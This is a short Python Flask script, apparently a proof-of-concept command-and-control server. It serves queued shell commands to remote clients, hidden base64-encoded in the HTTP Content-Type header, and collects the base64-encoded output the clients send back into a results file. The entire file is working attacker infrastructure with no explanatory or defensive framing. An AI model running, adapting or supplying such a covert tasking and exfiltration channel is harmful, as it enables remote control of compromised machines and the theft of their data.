
#!/usr/bin/env python

from base64 import b64encode, b64decode
from flask import Flask, Response, request

APP = Flask(__name__)


@APP.route('/')
def poc():
    action = request.args.get('action')
    data = request.args.get('data')

    if action == 'execute_command':
        with open('commands.txt', 'r') as _file:
            commands = _file.read()
        response = Response(response='OK', status=204, mimetype='text/plain')
        response.headers['Content-Type'] = b64encode(commands)
        open('commands.txt', 'w').close()  # NOTE: Empty the file contents.

    elif action == 'send_output':
        with open('results.txt', 'a') as _file:
            _file.write("{0}".format(b64decode(data)))
        response = Response(response='OK', status=201, mimetype='text/plain')

    else:
        response = Response(response='OK', status=200, mimetype='text/plain')

    return response


APP.run(host='0.0.0.0', threaded=True)
